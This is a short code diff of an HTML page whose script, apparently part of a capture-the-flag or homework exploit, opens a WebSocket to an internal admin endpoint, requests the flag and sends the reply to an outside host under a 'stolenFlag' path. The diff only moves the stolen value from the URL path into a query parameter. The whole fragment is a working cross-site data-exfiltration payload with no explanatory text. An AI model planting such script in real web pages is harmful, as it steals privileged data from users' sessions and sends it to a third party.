@@ -7,7 +7,7 @@ const ws = new WebSocket(`ws://web:8080/admin/ws`);
 ws.onopen = () => ws.send("flag");
 ws.onmessage = (event) => {
   const response = event.data;
-  fetch(`http://hw2p3.ckodser.ir/stolenFlag/${response}`);
+  fetch(`http://hw2p3.ckodser.ir/stolenFlag?flag=${response}`);
 };
         </script>
     </body>
